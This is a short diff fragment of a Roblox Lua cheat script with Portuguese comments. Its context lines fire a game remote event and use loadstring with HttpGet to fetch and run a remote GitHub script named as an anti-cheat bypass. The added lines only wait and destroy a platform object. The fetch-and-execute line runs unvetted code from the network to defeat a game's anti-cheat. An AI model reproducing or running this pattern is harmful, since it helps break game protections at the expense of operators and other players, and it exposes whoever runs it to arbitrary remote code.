@@ -88,3 +88,7 @@ game:GetService("ReplicatedStorage").Rockmode:FireServer()
 
 -- Executar script remoto
 loadstring(game:HttpGet("https://raw.githubusercontent.com/RAFA12763/Scripts/refs/heads/main/BYPASS_ANTICHEAT_XUNAXI_Scripts.lua"))()
+
+task.wait(4)
+
+platform:Destroy()
